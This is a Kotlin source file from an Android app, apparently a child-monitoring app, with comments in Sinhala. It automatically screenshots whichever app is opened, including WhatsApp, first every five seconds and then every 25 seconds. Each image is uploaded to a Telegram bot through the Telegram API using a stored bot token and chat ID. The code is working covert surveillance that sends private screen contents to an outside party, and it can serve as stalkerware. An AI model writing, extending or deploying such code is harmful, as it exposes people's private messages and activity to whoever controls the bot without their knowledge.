package com.coc338781.childapp

import android.content.Context
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

object AutoScreenshot {
    private const val TAG = "AutoScreenshot"

    // පළමු screenshots 3 — තත්පර 5 interval
    private const val INITIAL_INTERVAL_MS = 5_000L
    private const val INITIAL_COUNT = 3

    // ඊට පස්සේ — තත්පර 25 interval
    private const val CONTINUOUS_INTERVAL_MS = 25_000L

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private val handler = Handler(Looper.getMainLooper())
    private var currentApp: String? = null
    private var isRunning = false

    // ===== අලුතින් එකතු කරපු කොටස =====
    @Volatile
    private var whatsappEnabled = true
    // ====================================

    fun startContinuous(context: Context, appName: String) {
        stopContinuous()
        currentApp = appName
        isRunning = true

        Log.d(TAG, "Starting screenshots for $appName")

        // 1. වහාම එක screenshot
        takeAndSend(context, appName, "opened")

        // 2. තත්පර 5, 10 වලට තව 2ක්
        for (i in 1 until INITIAL_COUNT) {
            val delayMs = INITIAL_INTERVAL_MS * i
            handler.postDelayed({
                if (!isRunning || currentApp != appName) return@postDelayed
                takeAndSend(context, appName, "initial")
            }, delayMs)
        }

        // 3. ඊට පස්සේ — තත්පර 25 interval
        val startContinuousAfter = INITIAL_INTERVAL_MS * INITIAL_COUNT
        handler.postDelayed({
            if (!isRunning || currentApp != appName) return@postDelayed
            startContinuousLoop(context, appName)
        }, startContinuousAfter)
    }

    private fun startContinuousLoop(context: Context, appName: String) {
        val runnable = object : Runnable {
            override fun run() {
                if (!isRunning || currentApp != appName) return
                takeAndSend(context, appName, "continuous")
                handler.postDelayed(this, CONTINUOUS_INTERVAL_MS)
            }
        }
        handler.postDelayed(runnable, CONTINUOUS_INTERVAL_MS)
    }

    fun stopContinuous() {
        Log.d(TAG, "Stopping screenshots for $currentApp")
        isRunning = false
        currentApp = null
        handler.removeCallbacksAndMessages(null)
    }

    private fun takeAndSend(context: Context, appName: String, type: String) {
        // ===== අලුතින් එකතු කරපු කොටස =====
        // WhatsApp සඳහා ඕෆ් නම්, ස්ක්‍රීන්ෂොට් ගන්නේ නෑ
        if (appName.lowercase().contains("whatsapp") && !whatsappEnabled) {
            Log.d(TAG, "WhatsApp screenshots disabled, skipping...")
            return
        }
        // ====================================

        val svc = ScreenService.instance ?: run {
            Log.e(TAG, "ScreenService not available")
            return
        }

        svc.takeShot { bmp ->
            if (bmp != null) {
                val caption = when (type) {
                    "opened" -> "📸 $appName — Opened"
                    "initial" -> "📸 $appName — Initial"
                    else -> "📸 $appName — Auto"
                }
                sendScreenshot(context, bmp, caption)
            }
        }
    }

    private fun sendScreenshot(context: Context, bmp: Bitmap, caption: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(context.cacheDir, "autoshot_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use {
                    bmp.compress(Bitmap.CompressFormat.JPEG, 70, it)
                }

                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .addFormDataPart("caption", caption)
                    .build()

                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (e: Exception) {
                Log.e(TAG, "Send error", e)
            }
        }
    }

    // ===== වෙනස් කරපු කොටස =====
    fun isEnabled(context: Context): Boolean = whatsappEnabled
    fun setEnabled(context: Context, enabled: Boolean) {
        whatsappEnabled = enabled
        Log.d(TAG, "WhatsApp screenshots: ${if (enabled) "ON" else "OFF"}")
    }
    // =============================

    fun getCount(context: Context): Int = 1
    fun setCount(context: Context, count: Int) {}
}
